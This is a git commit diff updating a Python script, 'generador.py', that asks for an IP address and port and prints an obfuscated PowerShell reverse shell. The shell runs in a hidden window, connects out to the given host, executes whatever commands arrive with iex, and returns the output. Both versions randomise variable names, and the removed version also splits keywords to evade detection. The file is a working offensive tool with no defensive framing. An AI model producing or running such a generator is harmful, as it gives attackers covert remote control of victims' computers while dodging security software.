4b56ba0613b611c7941235d34b8b190986262e74
Luftwaffe-66 <148586282+1603160@users.noreply.github.com>
2023-11-08 23:11:53 +0100

    Update generador.py

--- generador.py
+++ generador.py
@@ -1,39 +1,41 @@
 import random
 import string
 
-def generate_obfuscated_powershell_script(ip_address, port_number):
-     # Function to generate random variable names
-     def random_variable_name(size=4):
-         return ''.join(random.choice(string.ascii_letters) for _ in range(size))
+# Function to generate random variable names
+def random_variable_name(size=4):
+    return ''.join(random.choice(string.ascii_letters) for _ in range(size))
 
-     # PowerShell script template
-     template="""
+def generate_obfuscated_powershell_script(ip_address, port_number):
+    # PowerShell script template using f-strings for better readability
+    template = f"""
 Start-Process $PSHOME\\powershell.exe -ArgumentList {{
-     ${tcp_client_var} = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
-     ${network_stream_var} = ${tcp_client_var}.$('Get'+'Stream')();
-     [byte[]]${byte_array_var} = 0..65535|%{{0}};
-     while((${command_var} = ${network_stream_var}.Read(${byte_array_var}, 0, ${byte_array_var}.Length)) -ne 0) {{
-         ${output_var} = (New-Object -TypeName System.Text.ASCIIEncoding).$('Get'+'String')(${byte_array_var},0, ${command_var});
-         ${encoder_var} = (i''ex ${output_var} 2>&1 | Out-String);
-         ${input_var} = ${encoder_var} + 'PS ' + (pwd).Path + '> ';
-         ${decoded_input_var} = ([text.encoding]::ASCII).$('Get'+'Bytes')(${input_var});
-         ${network_stream_var}.Write(${decoded_input_var},0,${decoded_input_var}.Length);
-         ${network_stream_var}.Flush();
-     }};
-     ${tcp_client_var}.Close();
+    ${{var1}} = New-Object System.Net.Sockets.TCPClient('{ip_address}',{port_number});
+    ${{var2}} = ${{var1}}.GetStream();
+    [byte[]]${{var3}} = 0..65535|%{{0}};
+    while((${{var4}} = ${{var2}}.Read(${{var3}}, 0, ${{var3}}.Length)) -ne 0){{
+        ${{var5}} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${{var3}},0,${{var4}});
+        ${{var6}} = (iex ${{var5}} 2>&1 | Out-String);
+        ${{var7}} = ${{var6}} + 'PS ' + (Get-Location).Path + '> ';
+        ${{var8}} = ([text.encoding]::ASCII).GetBytes(${{var7}});
+        ${{var2}}.Write(${{var8}},0,${{var8}}.Length);
+        ${{var2}}.Flush();
+    }};
+    ${{var1}}.Close();
 }} -WindowStyle Hidden
 """
 
-     # Generate random variable names
-     variables = {f"var{i}": random_var_name() for i in range(1, 9)}
+    # Generate random variable names
+    variables = {f"var{i}": random_variable_name() for i in range(1, 9)}
 
-     # Fill the template with the IP, port and random variable names
-     script = template.format(ip=ip, port=port, **variables)
-     return script
+    # Replace the placeholders with actual random variable names
+    for i in range(1, 9):
+        template = template.replace(f"${{var{i}}}", f"${random_variable_name()}")
+
+    return template
 
 # Ask the user for the IP and port
 ip = input("Enter the IP address: ")
-port = input("Enter the port: ")
+port = input("Enter the port number: ")
 
 # Generate and display the obfuscated PowerShell script
 ps_script = generate_obfuscated_powershell_script(ip, port)
